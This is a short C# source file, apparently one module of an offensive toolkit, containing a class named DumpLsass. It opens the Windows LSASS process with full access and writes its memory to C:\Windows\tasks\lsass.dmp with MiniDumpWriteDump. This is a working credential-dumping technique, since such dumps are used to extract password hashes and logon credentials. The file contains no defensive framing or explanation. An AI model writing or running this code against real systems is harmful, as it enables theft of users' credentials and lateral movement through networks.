using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace ExtensionToolkit.Func
{
    internal class DumpLsass
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump( IntPtr hProcess, int ProcessId,
                                              IntPtr hFile, int DumpType, IntPtr ExceptionParam,
                                              IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        public static void DumpLs()
        {
            string outputFile = "C:\\Windows\\tasks\\lsass.dmp";
            FileStream dumpFile = new FileStream(outputFile, FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (dumped)
            {
                Console.WriteLine($"Output at {outputFile}");
            }
        }
    }
}
